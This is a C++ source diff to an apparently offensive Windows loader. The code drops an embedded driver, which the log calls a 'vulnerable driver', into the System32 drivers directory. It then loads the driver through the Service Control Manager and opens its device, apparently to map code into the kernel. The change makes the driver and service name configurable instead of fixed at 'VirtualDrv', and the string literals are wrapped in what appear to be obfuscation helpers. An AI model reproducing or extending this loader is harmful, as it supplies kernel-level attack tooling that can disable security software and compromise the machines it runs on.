@@ -399,9 +399,9 @@ bool StopDriverService( const wchar_t* serviceName, bool bDelete )
 	return bDelete ? ( isStopped && deleted ) : isStopped;
 }
 
-bool BuildMapperDriverPathW( wchar_t* buffer, size_t count )
+bool BuildMapperDriverPathW( wchar_t* buffer, size_t count, const wchar_t* driverFileName )
 {
-	if ( !buffer || !count )
+	if ( !buffer || !count || !driverFileName )
 		return false;
 
 	buffer[ 0 ] = 0;
@@ -409,12 +409,20 @@ bool BuildMapperDriverPathW( wchar_t* buffer, size_t count )
 	if ( !GetSystemDirectoryW( buffer, s_cast<UINT>( count ) ) )
 		return false;
 
-	return wcscat_s( buffer, count, pstrw( L"\\drivers\\VirtualDrv.sys" ) ) == 0;
+	std::wstring path( buffer );
+	path += pstrw( L"\\drivers\\" );
+	path += driverFileName;
+
+	if ( path.size( ) + 1 > count )
+		return false;
+
+	wcscpy_s( buffer, count, path.c_str( ) );
+	return true;
 }
 
-bool BuildMapperDriverPathA( char* buffer, size_t count )
+bool BuildMapperDriverPathA( char* buffer, size_t count, const char* driverFileName )
 {
-	if ( !buffer || !count )
+	if ( !buffer || !count || !driverFileName )
 		return false;
 
 	buffer[ 0 ] = 0;
@@ -422,19 +430,49 @@ bool BuildMapperDriverPathA( char* buffer, size_t count )
 	if ( !GetSystemDirectoryA( buffer, s_cast<UINT>( count ) ) )
 		return false;
 
-	return strcat_s( buffer, count, pstra( "\\drivers\\VirtualDrv.sys" ) ) == 0;
+	std::string path( buffer );
+	path += pstra( "\\drivers\\" );
+	path += driverFileName;
+
+	if ( path.size( ) + 1 > count )
+		return false;
+
+	strcpy_s( buffer, count, path.c_str( ) );
+	return true;
 }
 
-NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* devicePath, const void* driverData, size_t driverSize, HANDLE* deviceHandle, uint32_t statusBase )
+bool BuildMapperDriverPathW( wchar_t* buffer, size_t count )
+{
+	return BuildMapperDriverPathW( buffer, count, pstrw( L"VirtualDrv.sys" ) );
+}
+
+bool BuildMapperDriverPathA( char* buffer, size_t count )
+{
+	return BuildMapperDriverPathA( buffer, count, pstra( "VirtualDrv.sys" ) );
+}
+
+NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* devicePath, const void* driverData, size_t driverSize, HANDLE* deviceHandle, uint32_t statusBase, const char* serviceName )
 {
 	if ( !backendName || !devicePath || !driverData || !driverSize || !deviceHandle )
 		return STATUS_INVALID_PARAMETER;
 
 	*deviceHandle = INVALID_HANDLE_VALUE;
 
+	std::string ansiServiceName = serviceName ? std::string( serviceName ) : std::string( pstra( "VirtualDrv" ) );
+	std::wstring wDriverFileNameSuffix;
+
+	if ( serviceName )
+	{
+		wDriverFileNameSuffix = std::wstring( serviceName, serviceName + std::strlen( serviceName ) ) + pstrw( L".sys" );
+	}
+	else
+	{
+		wDriverFileNameSuffix = pstrw( L"VirtualDrv.sys" );
+	}
+
 	wchar_t wDrvFileName[ MAX_PATH * 2 ]{};
 
-	if ( !BuildMapperDriverPathW( wDrvFileName, _countof( wDrvFileName ) ) )
+	if ( !BuildMapperDriverPathW( wDrvFileName, _countof( wDrvFileName ), wDriverFileNameSuffix.c_str( ) ) )
 	{
 		LOG_SEC( "[-] - [%s] Ldr: GetSystemDirectoryW failed", backendName );
 		return statusBase;
@@ -444,13 +482,15 @@ NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* de
 
 	if ( written != driverSize )
 	{
-		LOG_SEC( "[-] - [%s] Ldr: Error writing VirtualDrv.sys on disk written=0x%X expected=0x%llx", backendName, written, driverSize );
+		LOG_SEC( "[-] - [%s] Ldr: Error writing driver on disk written=0x%X expected=0x%llx", backendName, written, driverSize );
 		return statusBase + 1;
 	}
 
 	char drvFileName[ MAX_PATH ]{};
 
-	if ( !BuildMapperDriverPathA( drvFileName, _countof( drvFileName ) ) )
+	std::string ansiDriverSuffix = ansiServiceName + pstra( ".sys" );
+
+	if ( !BuildMapperDriverPathA( drvFileName, _countof( drvFileName ), ansiDriverSuffix.c_str( ) ) )
 	{
 		LOG_SEC( "[-] - [%s] Ldr: GetSystemDirectoryA failed", backendName );
 		return statusBase + 2;
@@ -491,9 +531,9 @@ NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* de
 		}
 	}
 
-	if ( const auto status = LoadAndUnload( pstra( "VirtualDrv" ), drvFileName, true, false ) )
+	if ( const auto status = LoadAndUnload( ansiServiceName.c_str( ), drvFileName, true, false ) )
 	{
-		LOG_SEC( "[-] - [%s] Ldr: LoadDriver VirtualDrv failed [%ls] Status %X", backendName, wDevicePathOnly.c_str( ), status );
+		LOG_SEC( "[-] - [%s] Ldr: LoadDriver %s failed [%ls] Status %X", backendName, ansiServiceName.c_str( ), wDevicePathOnly.c_str( ), status );
 		return status;
 	}
 
@@ -502,11 +542,11 @@ NTSTATUS DropLoadAndOpenMapperDriver( const char* backendName, const wchar_t* de
 	if ( !*deviceHandle || *deviceHandle == INVALID_HANDLE_VALUE )
 	{
 		LOG_SEC( "[-] - [%s] SCM: Driver device open failure", backendName );
-		UnloadMapperDriver( );
+		UnloadMapperDriver( ansiServiceName.c_str( ) );
 		return statusBase + 3;
 	}
 
-	LOG_SEC( "[!] - [%s] SCM: Vulnerable driver loaded as VirtualDrv and opened", backendName );
+	LOG_SEC( "[!] - [%s] SCM: Vulnerable driver loaded as %s and opened", backendName, ansiServiceName.c_str( ) );
 	return STATUS_SUCCESS;
 }
 
@@ -519,13 +559,16 @@ void CloseMapperDevice( HANDLE* deviceHandle )
 	*deviceHandle = INVALID_HANDLE_VALUE;
 }
 
-NTSTATUS UnloadMapperDriver( )
+NTSTATUS UnloadMapperDriver( const char* serviceName )
 {
+	std::string ansiServiceName = serviceName ? std::string( serviceName ) : std::string( pstra( "VirtualDrv" ) );
+	std::string ansiDriverSuffix = ansiServiceName + pstra( ".sys" );
+
 	char drvFileName[ MAX_PATH ]{};
 
-	if ( BuildMapperDriverPathA( drvFileName, _countof( drvFileName ) ) )
+	if ( BuildMapperDriverPathA( drvFileName, _countof( drvFileName ), ansiDriverSuffix.c_str( ) ) )
 	{
-		return LoadAndUnload( pstra( "VirtualDrv" ), drvFileName, false, false );
+		return LoadAndUnload( ansiServiceName.c_str( ), drvFileName, false, false );
 	}
 
 	return STATUS_UNSUCCESSFUL;
